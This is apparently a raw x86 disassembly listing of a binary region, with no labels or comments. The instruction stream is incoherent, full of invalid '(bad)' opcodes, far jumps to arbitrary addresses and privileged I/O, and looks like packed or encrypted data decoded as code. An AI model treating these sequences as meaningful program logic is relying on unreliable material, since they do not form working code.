  42010d:	jmp    0x42013b
  42010f:	fadd   DWORD PTR [edx+0x67c9e803]
  420115:	scas   al,BYTE PTR es:[edi]
  420116:	xor    eax,0xfffb38b7
  42011b:	mov    bh,0x33
  42011d:	stc    
  42011e:	push   ss
  42011f:	iret   
  420120:	fidivr DWORD PTR [edx-0x56e975df]
  420126:	div    esi
  420128:	call   0xbcc053ec
  42012d:	mov    dh,BYTE PTR [eax-0x6c46082b]
  420133:	icebp  
  420134:	je     0x4201ac
  420136:	clc    
  420137:	jae    0x420162
  420139:	dec    ecx
  42013a:	sub    ebx,eax
  42013c:	pop    ss
  42013d:	addr16 pusha 
  42013f:	fnstcw WORD PTR [edi]
  420141:	cs cwde 
  420143:	dec    esi
  420144:	mov    ebx,0x52d75669
  420149:	xchg   edi,eax
  42014a:	test   eax,0x2fab321f
  42014f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420150:	nop
  420151:	(bad)  
  420152:	call   0x877:0x4aed58b0
  420159:	out    dx,al
  42015a:	(bad)  
  42015b:	out    0xef,eax
  42015d:	push   ds
  42015e:	retf   
  42015f:	add    eax,0xd9e14015
  420164:	out    dx,al
  420165:	clc    
  420166:	stc    
  420167:	les    esp,FWORD PTR [edi-0x53]
  42016a:	aas    
  42016b:	add    BYTE PTR [edi],bl
  42016d:	push   ebp
  42016e:	mov    al,0x72
  420170:	repnz pop esi
  420172:	inc    esi
  420173:	sub    eax,DWORD PTR [esi-0x44]
  420176:	and    edi,DWORD PTR [edi+0x52]
  420179:	mov    eax,0x79254e98
  42017e:	test   eax,0xeb6ac4e5
  420183:	sub    eax,0x37b5e61d
	...
  420190:	add    BYTE PTR [edx+ecx*1-0x6060f363],dl
  420197:	xchg   ebp,eax
  420198:	call   0xc04f:0x7836e732
  42019f:	xor    BYTE PTR [ebp+0x2b],0x7c
  4201a3:	add    DWORD PTR [eax],eax
  4201a5:	scas   eax,DWORD PTR es:[edi]
  4201a6:	add    eax,DWORD PTR [eax]
  4201a8:	add    BYTE PTR [eax],al
  4201aa:	outs   dx,DWORD PTR ds:[esi]
  4201ab:	push   ecx
  4201ac:	pop    ds
  4201ad:	push   esp
  4201ae:	rcl    DWORD PTR [ebx],1
  4201b0:	xchg   DWORD PTR [ecx-0xfe8b0d0],eax
  4201b6:	mov    ecx,ds
  4201b8:	clc    
  4201b9:	mov    ebx,0x31ccb415
  4201be:	call   0x5c82b69b
  4201c3:	xlat   BYTE PTR ds:[ebx]
  4201c4:	mov    ss,ebx
  4201c6:	(bad)  
  4201c8:	sub    al,0xd4
  4201ca:	fld    QWORD PTR [ebp+0x9]
  4201cd:	xchg   edi,eax
  4201ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201cf:	or     cl,bl
  4201d1:	push   es
  4201d2:	lods   al,BYTE PTR ds:[esi]
  4201d3:	jo     0x42022f
  4201d5:	inc    esp
  4201d6:	mov    ah,0x16
  4201d8:	call   0xb88f88bd
  4201dd:	inc    ecx
  4201de:	mov    cl,0x4e
  4201e0:	mov    edi,0x5b884fe2
  4201e5:	js     0x42020c
  4201e7:	or     eax,0x195ec6a3
  4201ec:	sar    DWORD PTR [edx],1
  4201ee:	aaa    
  4201ef:	sbb    dh,BYTE PTR [ecx]
  4201f1:	aas    
  4201f2:	aad    0x2a
  4201f4:	push   ss
  4201f5:	add    BYTE PTR [edi],bh
  4201f7:	push   eax
  4201f8:	rcr    al,cl
  4201fa:	adc    eax,0x8b0634f6
  4201ff:	repnz xor DWORD PTR [esp+eax*4],0x896caba7
  420207:	mov    ah,0x86
  420209:	adc    DWORD PTR [edx+0x3e],edi
  42020c:	das    
  42020d:	mov    ah,0x56
  42020f:	inc    ecx
  420210:	ret    0x7745
  420213:	scas   eax,DWORD PTR es:[edi]
  420214:	pop    ss
  420215:	sbb    esp,DWORD PTR [ecx+0xe]
  420218:	pop    ecx
  420219:	pushf  
  42021a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42021b:	shl    BYTE PTR [eax+edx*2+0x6fc4de89],1
  420222:	call   0x9f2d:0x3fda21fc
  420229:	and    bh,BYTE PTR [edi-0x5d]
  42022c:	(bad)  [ebp-0x4c]
  42022f:	xor    al,0x50
  420231:	pop    ecx
  420232:	add    ebp,esp
  420234:	scas   eax,DWORD PTR es:[edi]
  420235:	dec    ebx
  420236:	mov    al,ds:0x4d5bf56d
  42023b:	pop    ebp
  42023c:	retf   
  42023d:	pop    ss
  42023e:	fwait
  42023f:	std    
  420240:	pushf  
  420241:	rcr    DWORD PTR ds:0x5cecef4,cl
  420247:	pop    esp
  420248:	imul   ebx,DWORD PTR [ecx+0x63],0xffffffc5
  42024c:	int    0x1
  42024e:	or     dl,BYTE PTR [ecx+0x2af34061]
  420254:	repz pop edx
  420256:	jle    0x42023b
  420258:	push   ecx
  420259:	repnz add al,0x68
  42025c:	ror    BYTE PTR [ebp+0x4a4f9c76],1
  420262:	daa    
  420263:	jmp    0x46ef608a
  420268:	add    al,0x5e
  42026a:	mov    bl,BYTE PTR [esi+0x113cec42]
  420270:	mov    cl,BYTE PTR [eax]
  420272:	(bad)  
  420273:	out    0x69,eax
  420275:	mov    eax,ds:0x597960fd
  42027a:	mov    al,0xa7
  42027c:	adc    esp,DWORD PTR [eax+0x47fdd8f9]
  420282:	xor    BYTE PTR [ebp+0x51f9eb4f],dl
  420288:	pop    edi
  420289:	pop    eax
  42028a:	outs   dx,DWORD PTR ds:[esi]
  42028b:	test   BYTE PTR [eax+0x6e],dh
  42028e:	test   BYTE PTR [edx+ecx*1+0x42],dh
  420292:	lods   eax,DWORD PTR ds:[esi]
  420293:	xor    DWORD PTR [ecx],0x6f
  420296:	iret   
  420297:	pop    esi
  420298:	mov    ebx,0xf8e4e3f6
  42029d:	pop    ecx
  42029e:	inc    ecx
  42029f:	in     eax,0x4
  4202a1:	fidivr WORD PTR [esi+eax*4-0x790b8677]
  4202a8:	outs   dx,BYTE PTR ds:[esi]
  4202a9:	cld    
  4202aa:	pop    edx
  4202ab:	outs   dx,BYTE PTR ds:[esi]
  4202ac:	popf   
  4202ad:	test   BYTE PTR [ecx+0x4d],al
  4202b0:	sub    al,0x8e
  4202b2:	inc    ecx
  4202b3:	add    dh,BYTE PTR [ecx]
  4202b5:	dec    ebp
  4202b6:	xchg   ebp,eax
  4202b7:	and    al,0xb8
  4202b9:	xor    BYTE PTR [edx+eax*4-0x7a],dh
  4202bd:	call   0x27e9:0xb7c8488f
  4202c4:	inc    esi
  4202c5:	inc    esi
  4202c6:	repnz lods al,BYTE PTR ds:[esi]
  4202c8:	adc    DWORD PTR [ebp+0x29f190c7],edx
  4202ce:	ret    0xc777
  4202d1:	cdq    
  4202d2:	data16 out dx,al
  4202d4:	lods   eax,DWORD PTR ds:[esi]
  4202d5:	(bad)  
  4202d6:	push   ebp
  4202d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202d8:	and    DWORD PTR ds:0xfc20b167,ecx
  4202de:	mov    ebx,0xbe1da84
  4202e3:	clc    
  4202e4:	rcl    DWORD PTR [ecx+ebx*2-0x53e5f3df],cl
  4202eb:	jp     0x42027d
  4202ed:	xor    BYTE PTR [edi+0x9],bl
  4202f0:	push   ds
  4202f1:	or     DWORD PTR [edx],ebx
  4202f3:	xlat   BYTE PTR ds:[ebx]
  4202f4:	lock or DWORD PTR [ecx+0x11],0x24
  4202f9:	icebp  
  4202fa:	sub    dl,BYTE PTR [esi+0x3d56dddc]
  420300:	cmp    BYTE PTR [ebx+0x7f],0x57
  420304:	cmp    DWORD PTR [ecx],ebp
  420306:	mov    ds:0xad5fd6ef,eax
  42030b:	jmp    0x5fda:0xae8c76c0
  420312:	or     esp,DWORD PTR [edi]
  420314:	mov    ds,WORD PTR [ecx-0x4f]
  420317:	or     eax,0xcbc420ea
  42031c:	pop    es
  42031d:	add    al,0xc1
  42031f:	call   0x1f912c49
  420324:	cmp    ecx,DWORD PTR [esi]
  420326:	mov    edx,DWORD PTR [edx-0x2f]
  420329:	mov    BYTE PTR [esi],bh
  42032b:	cmp    bh,BYTE PTR [esi-0x2]
  42032e:	mov    edi,0x567bc3e6
  420333:	mov    bl,0x9f
  420335:	mov    dh,0x89
  420337:	inc    ebp
  420338:	adc    al,0x24
  42033a:	lahf   
  42033b:	mov    bl,0x9d
  42033d:	jp     0x420375
  42033f:	dec    ecx
  420340:	cmp    DWORD PTR [edi+0x61],esi
  420343:	sbb    eax,edx
  420345:	ret    
  420346:	gs icebp 
  420348:	daa    
  420349:	push   ebx
  42034a:	adc    al,0x26
  42034c:	fdivr  QWORD PTR [ecx+0xa]
  42034f:	pop    edx
  420350:	fcmovbe st,st(6)
  420352:	stos   DWORD PTR es:[edi],eax
  420353:	jmp    0x8599:0x91fec83c
  42035a:	dec    ebp
  42035b:	js     0x4203dc
  42035d:	lea    eax,[eax-0x3e61b590]
  420363:	rol    ebp,1
  420365:	in     eax,dx
  420366:	repnz inc eax
  420368:	es add al,0x5c
  42036b:	adc    ecx,ebx
  42036d:	inc    ebp
  42036e:	cwde   
  42036f:	rcl    BYTE PTR [edi+0x2947b528],1
  420375:	cmp    BYTE PTR [ecx+0x2551d9d8],0x7b
  42037c:	sub    ah,0xd6
  42037f:	in     al,0x25
  420381:	xor    dh,0xa6
  420384:	jle    0x4203bc
  420386:	sub    al,0x3
  420388:	xor    eax,0x923ba503
  42038d:	mov    BYTE PTR [edi],ch
  42038f:	jo     0x420333
  420391:	inc    ecx
  420392:	xchg   ebx,eax
  420393:	(bad)  
  420394:	sub    eax,0x4f240291
  420399:	mov    bl,BYTE PTR ds:0xa2118994
  42039f:	out    dx,al
  4203a0:	pusha  
  4203a1:	lahf   
  4203a2:	sub    al,0xda
  4203a4:	mov    edx,0x77eecba7
  4203a9:	or     DWORD PTR [eax],edi
  4203ab:	mov    al,0x58
  4203ad:	aas    
  4203ae:	stos   BYTE PTR es:[edi],al
  4203af:	paddb  mm0,QWORD PTR [ecx]
  4203b2:	xchg   ebp,eax
  4203b3:	mov    ds:0xe2567286,eax
  4203b8:	push   ebx
  4203b9:	ja     0x420365
  4203bb:	imul   edx,DWORD PTR [esi-0x1c],0xffffffc1
  4203bf:	sbb    si,WORD PTR [esp+edx*1]
  4203c3:	(bad)  
  4203c4:	xor    bh,BYTE PTR fs:[ecx+edi*8-0x7b]
  4203c9:	(bad)  
  4203ca:	into   
  4203cb:	sbb    eax,0xb98b8677
  4203d0:	cwde   
  4203d1:	leave  
  4203d2:	pop    edi
  4203d3:	add    DWORD PTR [ecx+0x44316c1f],esi
  4203d9:	cwde   
  4203da:	fst    QWORD PTR [edx+0x1d95a450]
  4203e0:	shl    DWORD PTR [esi+eax*2-0x59],cl
  4203e4:	(bad)  
  4203e5:	inc    eax
  4203e6:	mov    ebx,0x57f61b26
  4203eb:	fcomp  DWORD PTR [esi-0x4b]
  4203ee:	jge    0x4203ba
  4203f0:	pop    edi
  4203f1:	aad    0xf8
  4203f3:	xor    DWORD PTR [esi-0x47e1593d],ebp
  4203f9:	in     eax,0x1d
  4203fb:	push   ecx
  4203fc:	push   cs
  4203fd:	pop    ecx
  4203fe:	xchg   ebx,eax
  4203ff:	arpl   WORD PTR [eax-0x7a],si
  420402:	sbb    dh,BYTE PTR [ebx]
  420404:	stc    
  420405:	dec    ebp
  420406:	mul    BYTE PTR [ebx+0x42]
  420409:	cmp    DWORD PTR [esi-0x9],esp
  42040c:	pop    esi
  42040d:	sub    dl,BYTE PTR [ebx-0x20]
  420410:	dec    sp
  420412:	jmp    0x420491
  420414:	push   ebp
  420415:	xor    DWORD PTR [ebx+edx*2],esp
  420418:	push   cs
  420419:	mov    bh,0xe0
  42041b:	xchg   edx,eax
  42041c:	rcr    DWORD PTR [eax+0x5b],cl
  42041f:	out    0xfd,al
  420421:	neg    DWORD PTR [edx-0x85519b1]
  420427:	pop    ss
  420428:	retf   0x1afa
  42042b:	mov    esi,0x90850e7e
  420430:	enter  0xd1e7,0x92
  420434:	inc    esp
  420435:	dec    ebx
  420436:	(bad)  
  420438:	add    BYTE PTR [edx+0x30],dl
  42043b:	mov    WORD PTR [edi],fs
  42043d:	mov    es,WORD PTR [ecx]
  42043f:	pop    esp
  420440:	dec    ebx
  420441:	addr16 mov bl,0x74
  420444:	scas   al,BYTE PTR es:[edi]
  420445:	fwait
  420446:	xor    esi,edx
  420448:	mov    ah,0x47
  42044a:	jl     0x42046c
  42044c:	adc    DWORD PTR [ebp+0x7b],0x4e
  420450:	jmp    0x58ed:0x2a9f227a
  420457:	into   
  420458:	mov    eax,ds:0x3923af06
  42045d:	je     0x42047c
  42045f:	retf   0xb0b7
  420462:	ja     0x420497
  420464:	fsub   DWORD PTR [ecx]
  420466:	pop    ds
  420467:	fs inc edx
  420469:	daa    
  42046a:	adc    ebx,esp
  42046c:	jge    0x4204c7
  42046e:	pop    esp
  42046f:	xor    esi,0xffffff99
  420472:	pop    edx
  420473:	gs push ebx
  420475:	fs (bad) 
  420478:	sti    
  420479:	mov    ebp,0xfc2e71b6
  42047e:	in     eax,dx
  42047f:	hlt    
  420480:	cmp    al,BYTE PTR [edx+0x69]
  420483:	ror    DWORD PTR [edx],1
  420485:	sar    BYTE PTR [esi],1
  420487:	xchg   ebp,eax
  420488:	sub    bl,ah
  42048a:	jge    0x420444
  42048c:	std    
  42048d:	test   DWORD PTR [eax-0x39d067d2],esp
  420493:	cmp    al,BYTE PTR [edx]
  420495:	mov    WORD PTR [esi+0x5b],?
  420498:	cmp    al,BYTE PTR [ebp+0x2f65413c]
  42049e:	mul    dh
  4204a0:	scas   eax,DWORD PTR es:[edi]
  4204a1:	das    
  4204a2:	lods   al,BYTE PTR ds:[esi]
  4204a3:	xchg   esi,eax
  4204a4:	aaa    
  4204a5:	loope  0x4204ad
  4204a7:	pop    ebp
  4204a8:	mov    esp,0xe46f66ce
  4204ad:	cmp    DWORD PTR [edi-0x6e],0x7f
  4204b1:	(bad)  
  4204b2:	retf   
  4204b3:	loopne 0x4204da
  4204b5:	retf   
  4204b6:	imul   ebp,edx,0x6a
  4204b9:	ret    0x6817
  4204bc:	mov    eax,0x505ec380
  4204c1:	sbb    ch,BYTE PTR [esi]
  4204c3:	iret   
  4204c4:	push   es
  4204c5:	mov    ah,0x23
  4204c7:	outs   dx,BYTE PTR ds:[esi]
  4204c8:	xchg   edi,eax
  4204c9:	sub    eax,0x62f7571a
  4204ce:	inc    edi
  4204cf:	fldenv [esi+0x23b6b95b]
  4204d5:	mov    ecx,0x9454e7da
  4204da:	shl    DWORD PTR [bx+si+0x42],cl
  4204de:	jp     0x42053a
  4204e0:	jb     0x42048d
  4204e2:	lds    esi,FWORD PTR [bp+0x2b]
  4204e6:	repnz cmp ah,BYTE PTR [ecx-0x3ee79627]
  4204ed:	(bad)  
  4204ef:	jns    0x4204db
  4204f1:	jno    0x420534
  4204f3:	ins    BYTE PTR es:[edi],dx
  4204f4:	lods   al,BYTE PTR ds:[esi]
  4204f5:	xchg   DWORD PTR [esi+0x3fa85074],ecx
  4204fb:	cmp    esi,DWORD PTR [ebx+edi*2+0x21d4df14]
  420502:	daa    
  420503:	push   ds
  420504:	ret    
  420505:	out    0x4,al
  420507:	xor    ch,BYTE PTR [ecx+0x448dc3ab]
  42050d:	cld    
  42050e:	rcl    BYTE PTR [ecx],0x6e
  420511:	fisttp DWORD PTR [ebx]
  420513:	mov    ebx,0x2ace0d89
  420518:	and    DWORD PTR [edx+0xb],ebp
  42051b:	jle    0x4204eb
  42051d:	and    al,0xcd
  42051f:	fnstsw WORD PTR [edi-0x5a28d6b6]
  420525:	pop    esp
  420526:	dec    esp
  420527:	imul   BYTE PTR [ebx]
  420529:	aas    
  42052a:	sbb    al,0xb0
  42052c:	dec    edx
  42052d:	jp     0x420516
  42052f:	cs in  eax,dx
  420531:	ret    
  420532:	jno    0x420532
  420534:	lahf   
  420535:	aas    
  420536:	ret    
  420537:	outs   dx,BYTE PTR ds:[esi]
  420538:	jge    0x4205ae
  42053a:	mov    bh,bl
  42053c:	mov    edx,0x3e15db40
  420541:	int3   
  420542:	rcr    BYTE PTR [eax+0x33f960fb],cl
  420548:	mov    ebx,0x846e8117
  42054d:	or     bl,BYTE PTR [eax+0x17e5f0d5]
  420553:	shl    BYTE PTR [esi+0x5f13f6],1
	...
  420561:	nop
  420562:	mov    bl,0x8c
  420564:	fild   QWORD PTR [edi-0x1b002c01]
  42056a:	and    dh,0xd4
  42056d:	inc    ebx
  42056e:	mov    ch,0xaa
  420570:	mov    al,0xda
  420572:	jg     0x420575
  420574:	add    BYTE PTR [edi+0x79000003],ch
  42057a:	xchg   ebp,eax
  42057b:	xor    eax,0xa2714159
  420580:	or     eax,0x5c185928
  420585:	mov    ebp,0x985e7f39
  42058a:	push   esp
  42058b:	jge    0x420575
  42058d:	aad    0xbf
  42058f:	jl     0x420565
  420591:	mov    bh,0x67
  420593:	out    0x18,al
  420595:	stos   DWORD PTR es:[edi],eax
  420596:	test   BYTE PTR [edi+0x2328d04d],cl
  42059c:	stc    
  42059d:	jbe    0x420599
  42059f:	out    0x57,eax
  4205a1:	pop    esi
  4205a2:	cmovne esp,esp
  4205a5:	loop   0x42054c
  4205a7:	ins    BYTE PTR es:[edi],dx
  4205a8:	loopne 0x4205a4
  4205aa:	inc    eax
  4205ab:	stos   BYTE PTR es:[edi],al
  4205ac:	jns    0x420587
  4205ae:	pop    ss
  4205af:	das    
  4205b0:	sbb    ah,BYTE PTR [eax+0x6407848f]
  4205b6:	inc    eax
  4205b7:	test   DWORD PTR [edx-0x21],edi
  4205ba:	dec    BYTE PTR [ebx+0x58f2b00]
  4205c0:	xchg   BYTE PTR [edx],ah
  4205c2:	push   cs
  4205c3:	shr    BYTE PTR [ebx-0x12],1
  4205c6:	inc    ebx
  4205c7:	shr    DWORD PTR [ebp+0x553e4ecb],cl
  4205cd:	lahf   
  4205ce:	daa    
  4205cf:	pop    ds
  4205d0:	xor    DWORD PTR [eax-0x47ac2e62],ecx
  4205d6:	out    0xd9,al
  4205d8:	iret   
  4205d9:	cmp    ebp,edi
  4205db:	push   ebp
  4205dc:	push   esp
  4205dd:	or     cl,al
  4205df:	adc    eax,DWORD PTR [ecx-0x2c]
  4205e2:	mov    al,0x6c
  4205e4:	(bad)  
  4205e5:	cmc    
  4205e6:	js     0x42056d
  4205e8:	mov    ch,BYTE PTR [ebp+eiz*1+0x7ccdf190]
  4205ef:	(bad)
  4205f2:	dec    edx
  4205f3:	jb     0x420593
  4205f5:	mov    al,bl
  4205f7:	sbb    al,0xdd
  4205f9:	push   ds
  4205fa:	test   BYTE PTR [ecx],0x7b
  4205fd:	inc    esp
  4205fe:	call   0xfb7640f5
  420603:	loopne 0x42062d
  420605:	in     eax,dx
  420606:	popa   
  420607:	or     al,0x8d
  420609:	jne    0x4205af
  42060b:	pop    dx
  42060d:	mov    eax,ds:0x110aba42
  420612:	jno    0x42061d
  420614:	pop    es
  420615:	dec    ebx
  420616:	mov    dl,0xfd
  420618:	aaa    
  420619:	out    dx,eax
  42061a:	dec    ebx
  42061b:	add    eax,0xf8d633b0
  420620:	cmp    BYTE PTR [edx],0x9e
  420623:	and    bh,BYTE PTR [edx+0x254bd1fa]
  420629:	mov    eax,0xf475f80d
  42062e:	jecxz  0x42067b
  420630:	mov    esi,0x7d06d0ec
  420635:	dec    ecx
  420636:	or     DWORD PTR [ebx],eax
  420638:	add    esi,DWORD PTR [edx-0x3d67c09c]
  42063e:	mov    al,ds:0x3ce9c62d
  420643:	or     BYTE PTR [ebp-0x7d],0xe6
  420647:	fs into 
  420649:	repz sub DWORD PTR [esi+0x496b23dc],eax
  420650:	(bad)  
  420651:	ja     0x4206d0
  420653:	sub    eax,0x82add314
  420658:	add    al,0x2d
  42065a:	cmp    ah,BYTE PTR [ecx+0x654c9d03]
  420660:	mov    al,ds:0x5c477dca
  420665:	inc    DWORD PTR [eax]
  420667:	stos   DWORD PTR es:[edi],eax
  420668:	push   esp
  420669:	mov    al,0x64
  42066b:	mov    ds:0x75467512,eax
  420670:	iret   
  420671:	loope  0x420689
  420673:	cmc    
  420674:	xchg   BYTE PTR [ecx-0x75],dh
  420677:	sbb    ch,cl
  420679:	js     0x420678
  42067b:	in     eax,0xf3
  42067d:	pushf  
  42067e:	cmc    
  42067f:	pop    eax
  420680:	sub    al,0x61
  420682:	jp     0x42064e
  420684:	mov    ds:0x471e7413,al
  420689:	loope  0x420705
  42068b:	xor    al,ah
  42068d:	adc    al,0x56
  42068f:	inc    edx
  420690:	sub    edx,DWORD PTR [ebp+0x135ed460]
  420696:	sub    cl,BYTE PTR [ebx+ebx*8]
  420699:	in     al,0x3c
  42069b:	repnz or BYTE PTR [esp+edi*2-0x5c5d5ede],al
  4206a3:	mov    esi,0xde06634b
  4206a8:	test   eax,0x63128708
  4206ad:	in     eax,dx
  4206ae:	pop    edx
  4206af:	sub    al,0x51
  4206b1:	shld   DWORD PTR [edi],edx,cl
  4206b4:	aam    0x27
  4206b6:	xchg   esp,eax
  4206b7:	pop    ebx
  4206b8:	inc    ebp
  4206b9:	push   ds
  4206ba:	lea    eax,[ecx+eax*4+0x37e676eb]
  4206c1:	xor    al,0xc
  4206c3:	lods   al,BYTE PTR ds:[esi]
  4206c4:	mov    esi,0x509f1897
  4206c9:	xor    BYTE PTR [edi+0x18534f51],cl
  4206cf:	adc    eax,0x1ef24b0
  4206d4:	add    ebp,0xffffffcb
  4206d7:	cs mov ebp,0x5dce1a04
  4206dd:	ret    0x9633
  4206e0:	cmc    
  4206e1:	xchg   DWORD PTR [esi+0x741aca5b],edi
  4206e7:	out    0xb3,eax
  4206e9:	pop    esi
  4206ea:	test   DWORD PTR [ebp+0xb0913da],ebx
  4206f0:	mov    dh,0x34
  4206f2:	pop    ebp
  4206f3:	stos   BYTE PTR es:[edi],al
  4206f4:	mov    ch,BYTE PTR [edx+ebp*8]
  4206f7:	adc    BYTE PTR [edx-0x71],0x86
  4206fb:	mov    bh,0xed
  4206fd:	xchg   BYTE PTR [edx-0x3b064873],bh
  420703:	das    
  420704:	xchg   esi,eax
  420705:	shr    BYTE PTR [edx-0x7ed67784],0xbf
  42070c:	sbb    DWORD PTR [ebx+0xb],0xffc7c8e
  420713:	push   ecx
  420714:	dec    edx
  420715:	test   eax,0xf9336f57
  42071a:	jmp    0x95eff994
  42071f:	mov    ch,0x90
  420721:	(bad)  [edi]
  420723:	push   edi
  420724:	or     ch,dl
  420726:	or     eax,DWORD PTR [edx-0x4bbd7d43]
  42072c:	cld    
  42072d:	cmp    ebx,DWORD PTR [eax]
  42072f:	xchg   ebx,eax
  420730:	mov    eax,ds:0x3c3e838b
  420735:	and    ah,BYTE PTR [esp+edi*4]
  420738:	dec    edi
  420739:	sti    
  42073a:	mov    esi,0x7f2ce023
  42073f:	ds loope 0x42079c
  420742:	and    eax,0x585c7013
  420747:	cwde   
  420748:	cwde   
  420749:	push   es
  42074a:	ja     0x420704
  42074c:	les    edx,FWORD PTR [si-0x7e]
  420750:	or     edi,DWORD PTR [eax+0x3]
  420753:	fstp   st(1)
  420755:	stos   BYTE PTR es:[edi],al
  420756:	sub    BYTE PTR [ecx-0x43],0xc9
  42075a:	mov    DWORD PTR [edx],ebx
  42075c:	adc    dh,bl
  42075e:	mov    ah,0x36
  420760:	fs mov bh,0xc6
  420763:	cmp    DWORD PTR [edi+eax*2+0x75],ebx
  420767:	pop    ecx
  420768:	loop   0x420746
  42076a:	xor    eax,0x3b22967b
  42076f:	loop   0x42078e
  420771:	loope  0x420714
  420773:	sub    al,0xe4
  420775:	inc    ebp
  420776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420777:	retf   
  420778:	test   al,0xdc
  42077a:	pop    eax
  42077b:	inc    edi
  42077c:	adc    ebp,ebp
  42077e:	xor    cl,BYTE PTR [edx]
  420780:	call   FWORD PTR [ebx]
  420782:	mov    ecx,0xa7d6e0d5
  420787:	inc    ebx
  420788:	cmp    DWORD PTR [ecx-0x62],ebx
  42078b:	push   ebx
  42078c:	ror    BYTE PTR [ebp+0x47],cl
  42078f:	imul   esp,DWORD PTR [ebx],0x78
  420792:	repnz sbb al,0x71
  420795:	xchg   ebx,eax
  420796:	sbb    BYTE PTR [ebx+0x62],ch
  420799:	retf   0x526c
  42079c:	fwait
  42079d:	test   al,0x9f
  42079f:	jecxz  0x4207ea
  4207a1:	into   
  4207a2:	adc    ebp,DWORD PTR [eax+0x39]
  4207a5:	ss int3 
  4207a7:	push   ecx
  4207a8:	fwait
  4207a9:	pop    esp
  4207aa:	adc    eax,0x15277e56
  4207af:	stos   BYTE PTR es:[edi],al
  4207b0:	addr16 pushf 
  4207b2:	push   ss
  4207b3:	fldcw  WORD PTR [ecx+0x703577c1]
  4207b9:	enter  0x74ed,0x26
  4207bd:	dec    esi
  4207be:	outs   dx,BYTE PTR ds:[esi]
  4207bf:	push   ds
  4207c0:	mov    fs,WORD PTR [edi-0xc]
  4207c3:	leave  
  4207c4:	mov    eax,0x4bbbb69a
  4207c9:	cli    
  4207ca:	sub    DWORD PTR [eax+0x2b5f59f],esi
  4207d0:	call   esp
  4207d2:	sub    esp,eax
  4207d4:	push   edi
  4207d5:	ja     0x42076f
  4207d7:	stos   BYTE PTR es:[edi],al
  4207d8:	out    dx,eax
  4207d9:	ror    dl,0x1f
  4207dc:	sbb    edx,ebx
  4207de:	adc    dl,dh
  4207e0:	outs   dx,DWORD PTR ds:[esi]
  4207e1:	repnz mov BYTE PTR [eax+0x171d0880],bh
  4207e8:	xchg   BYTE PTR [ebp-0x1d],dl
  4207eb:	mov    BYTE PTR [esi+0x2c],bl
  4207ee:	xor    bl,BYTE PTR es:[ecx]
  4207f1:	xchg   esi,eax
  4207f2:	sahf   
  4207f3:	sbb    ebp,DWORD PTR [eax]
  4207f5:	sbb    BYTE PTR [ebx-0x54],0x6b
  4207f9:	lahf   
  4207fa:	stos   DWORD PTR es:[edi],eax
  4207fb:	stos   BYTE PTR es:[edi],al
  4207fc:	sbb    eax,0xfb9974ed
  420801:	xor    al,0xb5
  420803:	std    
  420804:	pop    esi
  420805:	jmp    0x4207f0
  420807:	inc    edi
  420808:	call   0x4a25:0xe0997056
  42080f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420810:	arpl   WORD PTR [ebx+eiz*2+0x645298d8],dx
  420817:	sub    edx,DWORD PTR [edx-0x78]
  42081a:	lahf   
  42081b:	inc    esp
  42081c:	mov    cl,0x7a
  42081e:	scas   eax,DWORD PTR es:[edi]
  42081f:	dec    edi
  420820:	int3   
  420821:	repz dec ebp
  420823:	inc    edi
  420824:	sbb    DWORD PTR [edi],esp
  420826:	inc    eax
  420827:	(bad)  
  420828:	(bad)  
  42082a:	imul   BYTE PTR [esi]
  42082c:	jo     0x420890
  42082e:	dec    esp
  42082f:	cmp    eax,0xab4de48
  420834:	pushf  
  420835:	and    eax,DWORD PTR [edx-0x16198eab]
  42083b:	test   DWORD PTR [ebx],ebx
  42083d:	adc    dl,BYTE PTR [esi+edi*1+0x3051df57]
  420844:	jnp    0x42086f
  420846:	xchg   BYTE PTR [ecx-0x36],cl
  420849:	mov    edi,0x80604e31
  42084e:	mov    ecx,0xc2606749
  420853:	add    DWORD PTR ds:0xdcf3edb6,0xffffffad
  42085a:	rol    DWORD PTR [ebx-0x6197acdf],cl
  420860:	js     0x4208a1
  420862:	fmul   QWORD PTR [edx+0x26b18ad9]
  420868:	ror    DWORD PTR [ebx],cl
  42086a:	add    BYTE PTR [ecx],cl
  42086c:	add    BYTE PTR [ebx-0x4f9da519],dh
  420872:	fnstenv [ebx]
  420874:	sub    al,0x9d
  420876:	inc    edi
  420877:	sbb    edi,eax
  420879:	cdq    
  42087a:	xor    eax,0xbf645dd2
  42087f:	shl    DWORD PTR cs:[ebx],0xa2
  420883:	stos   BYTE PTR es:[edi],al
  420884:	addr16 push ecx
  420886:	ds pop edx
  420888:	add    DWORD PTR [edx-0x79],ebp
  42088b:	das    
  42088c:	xchg   esi,eax
  42088d:	mov    WORD PTR [ecx],fs
  42088f:	imul   esp,DWORD PTR ds:0x7ccc2085,0xffffffd5
  420896:	cmp    edx,esp
  420898:	mov    WORD PTR [edi+0x4e],es
  42089b:	outs   dx,BYTE PTR ds:[esi]
  42089c:	push   0xffffff90
  42089e:	xor    al,bl
  4208a0:	clc    
  4208a1:	cvttps2pi mm0,QWORD PTR [esi]
  4208a4:	pop    esp
  4208a5:	call   0xa4f8:0x4bba6251
  4208ac:	add    esi,DWORD PTR [edi+0x6f9c7e16]
  4208b2:	mov    ds:0xc80d0ca,al
  4208b7:	dec    esi
  4208b8:	adc    bh,BYTE PTR [edi+0x46]
  4208bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208bc:	mov    cl,0xab
  4208be:	div    BYTE PTR [esi-0x7bae735f]
  4208c4:	sahf   
  4208c5:	enter  0xacca,0x4a
  4208c9:	xlat   BYTE PTR ds:[ebx]
  4208ca:	imul   ebp,DWORD PTR [edi-0x1f],0xffffffb8
  4208ce:	xchg   edi,eax
  4208cf:	jmp    0x4208ce
  4208d1:	fsub   QWORD PTR [ebp-0x2f1dc21f]
  4208d7:	mov    dh,0x1b
  4208d9:	xor    bl,BYTE PTR [ebp-0x6b952935]
  4208df:	in     eax,dx
  4208e0:	xchg   esi,eax
  4208e1:	ins    DWORD PTR es:[edi],dx
  4208e2:	cmp    ah,bh
  4208e4:	ins    BYTE PTR es:[edi],dx
  4208e5:	xchg   edi,eax
  4208e6:	dec    esp
  4208e7:	push   0xffffff95
  4208e9:	shr    edi,cl
  4208eb:	push   cs
  4208ec:	or     ebp,0xe52b4e52
  4208f2:	enter  0xa821,0xd5
